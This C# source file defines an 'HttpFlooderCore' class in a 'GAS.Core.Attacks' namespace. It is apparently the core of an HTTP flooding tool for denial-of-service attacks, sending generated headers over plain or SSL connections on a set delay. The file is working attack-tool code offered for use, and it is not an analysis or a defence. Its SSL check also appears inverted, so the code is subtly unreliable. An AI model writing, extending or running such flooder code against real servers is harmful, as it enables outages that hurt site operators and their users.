using System;
using System.IO;
using System.Net.Sockets;
using System.Threading.Tasks;

namespace GAS.Core.Attacks {
    public class HttpFlooderCore : AsyncHttpFlooder {
        private int _headersDelay;
        /// <summary>
        /// HeaderGenerator
        /// </summary>
        public Func<byte[], object, int> HeaderGenerator { get; set; }
        /// <summary>
        /// Delay between sent headers packets
        /// </summary>
        public int HeadersDelay {
            get { return this._headersDelay; }
            set {
                if ( this.Active )
                    throw new InvalidOperationException( "HeadersDelay setting is not allowed while attacking" );
                this._headersDelay = value;
            }
        }
        #region AsyncHttpFlooder
        /// <summary>
        /// Sends headers.
        /// Override to do magic with headers.
        /// Don't forget to append double \r\n to end
        /// </summary>
        /// <param name="stream">IO stream</param>
        /// <param name="basestream">Unwrapped IO stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>Was operation succeed</returns>
        protected override async Task<bool> SendHeaders(
            Stream stream,
            NetworkStream basestream,
            object token ) {
            return await AsyncFlooderImplementations.SendData(
                stream: stream,
                generator: this.HeaderGenerator,
                cancellationToken: () => this.Active,
                delay: this.HeadersDelay,
                generatorToken: token,
                bufferSize: 256
            );
        }
        /// <summary>
        /// Prepares stream for transfer.
        /// Gets stream from raw stream after connection
        /// Override to use ssl/similar.
        /// </summary>
        /// <param name="getStream">input stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>stream which will be used to transfer data</returns>
        protected override async Task<Stream> WrapStream( NetworkStream getStream, object token ) {
            return this.Ssl.UseSsl
                ? getStream as Stream
                : await AsyncFlooderImplementations.GetSslStream( getStream, this.Ssl.Domain ) as Stream;
        }
        #endregion
    }
}
